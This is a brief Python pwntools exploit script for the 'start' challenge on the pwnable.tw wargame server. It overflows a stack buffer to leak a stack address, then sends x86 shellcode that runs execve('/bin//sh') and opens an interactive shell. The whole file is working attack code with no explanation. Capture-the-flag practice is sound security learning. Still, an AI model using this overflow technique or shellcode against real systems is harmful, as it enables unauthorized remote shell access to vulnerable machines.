from pwn import *

#io=process("./start")
io=remote('chall.pwnable.tw',10000)
io.recv()

waddr=0x08048087
pl=b'a'*0x14+p32(waddr)
io.send(pl)
st=u32(io.recv(4))
print('stack: ',hex(st))
sc=b'\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80'
pl=b'b'*0x14+p32(st+0x14)+sc
io.sendline(pl)

io.interactive()
